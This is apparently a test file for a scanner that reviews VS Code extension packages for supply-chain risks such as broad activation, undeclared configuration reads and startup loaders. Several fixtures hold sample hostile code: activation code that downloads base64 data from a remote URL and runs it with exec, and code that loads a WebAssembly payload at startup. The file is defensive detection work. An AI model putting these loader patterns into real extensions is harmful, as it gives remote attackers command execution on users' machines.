import { describe, expect, test } from "vitest";
import { createPackageDiff } from "../server/lib/review";
import {
  buildVscodeReleaseManifest,
  createVscodeExtensionReview,
  isAllowedVscodeArtifactUrl,
  pickVscodeBaselineVersion,
  vscodeAdapter,
  VSCODE_RULE_IDS,
} from "../server/lib/adapters/vscode/index";

const SHA = "ab".repeat(32);

function file(path, textSample) {
  return {
    path,
    size: textSample.length,
    sha256: "00",
    flags: [],
    textSample,
  };
}

function binary(path, size) {
  return {
    path,
    size,
    sha256: "00",
    flags: ["binary"],
  };
}

function artifact(files) {
  return {
    path: "dist/remote-text-fetcher-1.0.0.vsix",
    sha256: SHA,
    files,
  };
}

function extensionPackageJson(overrides = {}) {
  return JSON.stringify(
    {
      name: "remote-text-fetcher",
      publisher: "example",
      version: "1.0.0",
      engines: { vscode: "^1.80.0" },
      main: "./out/extension",
      activationEvents: ["onStartupFinished"],
      contributes: {
        configuration: {
          properties: {
            "remoteTextFetcher.url": {
              type: "string",
            },
          },
        },
      },
      ...overrides,
    },
    null,
    2,
  );
}

describe("VS Code extension review adapter", () => {
  test("uses extension/package.json instead of a top-level decoy manifest", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: artifact([
        file(
          "package.json",
          JSON.stringify({
            name: "benign-decoy",
            publisher: "example",
            version: "1.0.0",
            engines: { vscode: "^1.80.0" },
            activationEvents: ["onCommand:benign.run"],
          }),
        ),
        file("extension/package.json", extensionPackageJson()),
        file("extension/out/extension.js", "exports.activate = () => {};"),
      ]),
    });

    expect(review.package).toEqual({ name: "example.remote-text-fetcher", version: "1.0.0" });
    expect(review.ruleFindings.map((finding) => finding.ruleId)).toEqual(
      expect.arrayContaining([VSCODE_RULE_IDS.broadActivation]),
    );
  });

  test("rejects duplicate normalized VSIX paths before trusting package.json", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);

    expect(() =>
      createVscodeExtensionReview({
        manifest,
        artifact: artifact([
          file(
            "extension/package.json",
            extensionPackageJson({
              activationEvents: ["onCommand:remoteTextFetcher.run"],
            }),
          ),
          file("extension/package.json", extensionPackageJson()),
          file("extension/out/extension.js", "exports.activate = () => {};"),
        ]),
      }),
    ).toThrow(/duplicate path package\.json/);
  });

  test("detects startup remote command loader behavior in a VSIX", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: artifact([
        file("extension/package.json", extensionPackageJson()),
        file(
          "extension/out/extension.js",
          [
            "const vscode = require('vscode');",
            "const https = require('https');",
            "const { exec } = require('child_process');",
            "function activate() {",
            "  const url = vscode.workspace.getConfiguration('agentService').get('url');",
            "  https.get(url, res => res.on('data', chunk => {",
            "    const cmd = Buffer.from(String(chunk), 'base64').toString('utf8');",
            "    exec(cmd);",
            "  }));",
            "}",
          ].join("\n"),
        ),
      ]),
    });

    const ruleIds = review.ruleFindings.map((finding) => finding.ruleId).sort();
    expect(ruleIds).toEqual(
      expect.arrayContaining([
        VSCODE_RULE_IDS.broadActivation,
        VSCODE_RULE_IDS.startupRemoteCommand,
        VSCODE_RULE_IDS.undeclaredConfigurationRead,
        "code.process-execution",
        "code.network-access",
        "code.dynamic-evaluation",
      ]),
    );
    expect(review.risk).toBe("critical");
    expect(review.package).toEqual({ name: "example.remote-text-fetcher", version: "1.0.0" });
  });

  test("detects startup remote command loaders in the browser entrypoint", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: artifact([
        file(
          "extension/package.json",
          extensionPackageJson({
            browser: "./web/extension",
          }),
        ),
        file("extension/out/extension.js", "exports.activate = () => {};"),
        file(
          "extension/web/extension.js",
          [
            "const https = require('https');",
            "const { exec } = require('child_process');",
            "function activate() {",
            "  https.get('https://example.invalid/payload', res => res.on('data', chunk => {",
            "    const cmd = Buffer.from(String(chunk), 'base64').toString('utf8');",
            "    exec(cmd);",
            "  }));",
            "}",
          ].join("\n"),
        ),
      ]),
    });

    expect(review.ruleFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: VSCODE_RULE_IDS.startupRemoteCommand,
          file: "web/extension.js",
        }),
      ]),
    );
    expect(review.risk).toBe("critical");
  });

  test("detects startup remote command loaders in activation-reachable modules", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: artifact([
        file("extension/package.json", extensionPackageJson()),
        file("extension/out/extension.js", "require('./loader'); exports.activate = () => {};"),
        file(
          "extension/out/loader.js",
          [
            "const https = require('https');",
            "const { exec } = require('child_process');",
            "https.get('https://example.invalid/payload', res => res.on('data', chunk => {",
            "  const cmd = Buffer.from(String(chunk), 'base64').toString('utf8');",
            "  exec(cmd);",
            "}));",
          ].join("\n"),
        ),
      ]),
    });

    expect(review.ruleFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: VSCODE_RULE_IDS.startupRemoteCommand,
          file: "out/loader.js",
        }),
      ]),
    );
    expect(review.risk).toBe("critical");
  });

  test("detects startup WebAssembly loaders in a VSIX", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: artifact([
        file("extension/package.json", extensionPackageJson()),
        file(
          "extension/out/extension.js",
          [
            "const go = new Go();",
            "async function activate() {",
            "  const source = await WebAssembly.instantiateStreaming(fetch('./payload.wasm'), go.importObject);",
            "  go.run(source.instance);",
            "}",
          ].join("\n"),
        ),
        binary("extension/out/payload.wasm", 824552),
      ]),
    });

    expect(review.ruleFindings.map((finding) => finding.ruleId)).toEqual(
      expect.arrayContaining([
        VSCODE_RULE_IDS.broadActivation,
        VSCODE_RULE_IDS.startupWasmLoader,
        "code.dynamic-evaluation",
        "file.native-artifact",
      ]),
    );
    expect(review.risk).toBe("critical");
  });

  test("detects startup WebAssembly loaders in activation-reachable modules", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: artifact([
        file("extension/package.json", extensionPackageJson()),
        file("extension/out/extension.js", "import './wasm.js'; exports.activate = () => {};"),
        file(
          "extension/out/wasm.js",
          [
            "const go = new Go();",
            "async function load() {",
            "  const source = await WebAssembly.instantiateStreaming(fetch('./payload.wasm'), go.importObject);",
            "  go.run(source.instance);",
            "}",
          ].join("\n"),
        ),
        binary("extension/out/payload.wasm", 824552),
      ]),
    });

    expect(review.ruleFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: VSCODE_RULE_IDS.startupWasmLoader,
          file: "out/wasm.js",
        }),
      ]),
    );
    expect(review.risk).toBe("critical");
  });

  test("does not treat unreachable WebAssembly loaders as startup-loaded", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: artifact([
        file("extension/package.json", extensionPackageJson()),
        file("extension/out/extension.js", "exports.activate = () => {};"),
        file(
          "extension/test/wasm.test.js",
          [
            "const go = new Go();",
            "async function loadFixture() {",
            "  const source = await WebAssembly.instantiateStreaming(fetch('./payload.wasm'), go.importObject);",
            "  go.run(source.instance);",
            "}",
          ].join("\n"),
        ),
        binary("extension/test/payload.wasm", 824552),
      ]),
    });

    expect(review.ruleFindings.map((finding) => finding.ruleId)).not.toEqual(
      expect.arrayContaining([VSCODE_RULE_IDS.startupWasmLoader]),
    );
  });

  test("accepts capitalized extension names the Marketplace grandfathered in", () => {
    const manifest = buildVscodeReleaseManifest("golang.Go", "0.42.0", [
      { path: "dist/go-0.42.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: {
        path: "dist/go-0.42.0.vsix",
        sha256: SHA,
        files: [
          file(
            "extension/package.json",
            JSON.stringify({
              name: "Go",
              publisher: "golang",
              version: "0.42.0",
              engines: { vscode: "^1.80.0" },
              activationEvents: ["onLanguage:go"],
            }),
          ),
          file("extension/out/extension.js", "exports.activate = () => {};"),
        ],
      },
    });

    expect(review.package).toEqual({ name: "golang.Go", version: "0.42.0" });
    expect(review.ruleFindings.map((finding) => finding.ruleId)).not.toEqual(
      expect.arrayContaining([VSCODE_RULE_IDS.metadataMismatch]),
    );
  });

  test("treats section-scoped reads of declared properties as declared", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: artifact([
        file(
          "extension/package.json",
          extensionPackageJson({
            activationEvents: ["onCommand:remoteTextFetcher.run"],
            contributes: {
              configuration: {
                properties: {
                  "remoteTextFetcher.advanced.url": { type: "string" },
                },
              },
            },
          }),
        ),
        file(
          "extension/out/extension.js",
          "const vscode = require('vscode'); vscode.workspace.getConfiguration('remoteTextFetcher.advanced').get('url');",
        ),
      ]),
    });

    expect(review.ruleFindings.map((finding) => finding.ruleId)).not.toEqual(
      expect.arrayContaining([VSCODE_RULE_IDS.undeclaredConfigurationRead]),
    );
  });

  test("allows declared configuration reads and narrow activation", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: artifact([
        file(
          "extension/package.json",
          extensionPackageJson({
            activationEvents: ["onCommand:remoteTextFetcher.run"],
          }),
        ),
        file(
          "extension/out/extension.js",
          "const vscode = require('vscode'); vscode.workspace.getConfiguration('remoteTextFetcher').get('url');",
        ),
      ]),
    });

    expect(review.ruleFindings.map((finding) => finding.ruleId)).not.toEqual(
      expect.arrayContaining([
        VSCODE_RULE_IDS.broadActivation,
        VSCODE_RULE_IDS.undeclaredConfigurationRead,
      ]),
    );
  });

  test("uses a marketplace baseline artifact when no previousArtifact is supplied", async () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const adapterInput = vscodeAdapter.parseInput({
      manifest,
      artifact: artifact([
        file(
          "extension/package.json",
          extensionPackageJson({
            activationEvents: ["onCommand:remoteTextFetcher.run"],
          }),
        ),
        {
          ...file("extension/out/extension.js", "exports.activate = () => 'new';"),
          sha256: "11",
        },
      ]),
    });
    const staged = await vscodeAdapter.acquireStaged({}, adapterInput, fakeVscodeBroker({}));
    const baselineUrl =
      "https://example.gallerycdn.vsassets.io/extensions/example/remote-text-fetcher/0.9.0/123/Microsoft.VisualStudio.Services.VSIXPackage";
    const broker = fakeVscodeBroker({
      versions: [
        {
          version: "1.0.0",
          lastUpdated: "2026-06-01T00:00:00Z",
          files: [
            { assetType: "Microsoft.VisualStudio.Services.VSIXPackage", source: baselineUrl },
          ],
        },
        {
          version: "0.9.0",
          lastUpdated: "2026-05-01T00:00:00Z",
          files: [
            { assetType: "Microsoft.VisualStudio.Services.VSIXPackage", source: baselineUrl },
          ],
        },
      ],
      downloadedFiles: [
        file(
          "extension/package.json",
          extensionPackageJson({
            version: "0.9.0",
            activationEvents: ["onCommand:remoteTextFetcher.run"],
          }),
        ),
        {
          ...file("extension/out/extension.js", "exports.activate = () => 'old';"),
          sha256: "22",
        },
      ],
    });

    const baseline = await vscodeAdapter.acquireBaseline({}, adapterInput, broker, staged);
    expect(broker.downloads).toEqual([baselineUrl]);
    expect(baseline.baseline).toMatchObject({
      version: "0.9.0",
      source: "latest-published",
      reason: "newest-marketplace-version",
    });
    expect(baseline.artifact?.manifest?.version).toBe("0.9.0");
    expect(createPackageDiff(baseline.artifact?.files ?? [], staged.artifact.files)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ path: "out/extension.js", status: "modified" }),
      ]),
    );
  });

  test("selects the newest allowed marketplace VSIX older than the candidate", () => {
    const oldUrl =
      "https://old.gallerycdn.vsassets.io/extensions/example/remote-text-fetcher/0.8.0/123/Microsoft.VisualStudio.Services.VSIXPackage";
    const newestUrl =
      "https://new.gallerycdn.vsassets.io/extensions/example/remote-text-fetcher/0.9.0/123/Microsoft.VisualStudio.Services.VSIXPackage";
    const futureUrl =
      "https://future.gallerycdn.vsassets.io/extensions/example/remote-text-fetcher/1.1.0/123/Microsoft.VisualStudio.Services.VSIXPackage";
    expect(isAllowedVscodeArtifactUrl(newestUrl)).toBe(true);
    expect(isAllowedVscodeArtifactUrl("https://example.invalid/payload.vsix")).toBe(false);
    expect(
      pickVscodeBaselineVersion(
        [
          {
            version: "1.0.0",
            lastUpdated: "2026-06-01T00:00:00Z",
            files: [
              { assetType: "Microsoft.VisualStudio.Services.VSIXPackage", source: newestUrl },
            ],
          },
          {
            version: "1.1.0",
            lastUpdated: "2026-06-15T00:00:00Z",
            files: [
              { assetType: "Microsoft.VisualStudio.Services.VSIXPackage", source: futureUrl },
            ],
          },
          {
            version: "0.8.0",
            lastUpdated: "2026-04-01T00:00:00Z",
            files: [{ assetType: "Microsoft.VisualStudio.Services.VSIXPackage", source: oldUrl }],
          },
          {
            version: "0.9.0",
            lastUpdated: "2026-05-01T00:00:00Z",
            files: [
              { assetType: "Microsoft.VisualStudio.Services.VSIXPackage", source: newestUrl },
            ],
          },
          {
            version: "0.95.0",
            lastUpdated: "2026-05-15T00:00:00Z",
            files: [
              {
                assetType: "Microsoft.VisualStudio.Services.VSIXPackage",
                source: "https://example.invalid/payload.vsix",
              },
            ],
          },
        ],
        "1.0.0",
      ),
    ).toEqual({
      version: "0.9.0",
      url: newestUrl,
      reason: "newest-marketplace-version",
    });
  });

  test("detects undeclared configuration reads through unscoped getConfiguration", () => {
    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
    ]);
    const review = createVscodeExtensionReview({
      manifest,
      artifact: artifact([
        file(
          "extension/package.json",
          extensionPackageJson({
            activationEvents: ["onCommand:remoteTextFetcher.run"],
          }),
        ),
        file(
          "extension/out/extension.js",
          "const vscode = require('vscode'); vscode.workspace.getConfiguration().get('agentService.url');",
        ),
      ]),
    });

    expect(review.ruleFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: VSCODE_RULE_IDS.undeclaredConfigurationRead,
          file: "out/extension.js",
          evidence: "reads undeclared VS Code configuration agentService.url",
        }),
      ]),
    );
  });
});

function fakeVscodeBroker({ versions = [], downloadedFiles = [] }) {
  return {
    downloads: [],
    async fetchExtensionVersions() {
      return versions;
    },
    async downloadPublicArtifact({ url }) {
      this.downloads.push(url);
      return { files: downloadedFiles };
    },
    dispose() {},
  };
}
